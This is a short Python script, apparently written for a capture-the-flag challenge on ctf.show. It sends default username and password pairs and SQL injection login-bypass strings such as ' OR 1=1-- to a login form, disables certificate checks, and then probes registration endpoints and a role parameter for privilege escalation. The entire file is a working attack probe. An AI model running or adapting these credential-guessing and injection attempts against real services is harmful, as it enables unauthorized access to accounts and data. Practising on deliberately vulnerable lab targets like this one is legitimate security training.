import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://c1dfcbb0-9c8a-478f-8b6b-bc87e9fbdc62.challenge.ctf.show"

s = requests.Session()
s.verify = False

# Test various login attempts to understand the auth
tests = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("Admin", "Admin"),
    ("administrator", "admin"),
    ("admin", "test"),
    ("test", "admin"),
    ("' OR 1=1--", "x"),
    ("' OR '1'='1", "x"),
    ("admin'--", "x"),
    ("admin' #", "x"),
    ("admin'/*", "x"),
    ("admin\"--", "x"),
    ("' UNION SELECT 1,2,3--", "x"),
]
print("=== Login attempts ===")
for u, p in tests:
    ns = requests.Session()
    ns.verify = False
    r = ns.post(f"{BASE}/login", data={"username": u, "password": p}, allow_redirects=False)
    loc = r.headers.get("Location", "")
    sc = r.headers.get("Set-Cookie", "")
    has_cookie = "session=" in sc
    print(f"  {u!r}/{p!r}: status={r.status_code} loc={loc} cookie={has_cookie}")

# Test registration-like attempts
print()
print("=== POST to other paths ===")
for path, data in [
    ("/register", {"username": "admin", "password": "admin"}),
    ("/signup", {"username": "admin", "password": "admin"}),
    ("/create", {"username": "admin", "password": "admin"}),
    ("/user", {"action": "create", "username": "admin", "password": "admin"}),
    ("/login", {"username": "admin", "password": "admin", "role": "admin"}),
]:
    r = s.post(f"{BASE}{path}", data=data, allow_redirects=False)
    print(f"  POST {path}: status={r.status_code} loc={r.headers.get('Location','')}")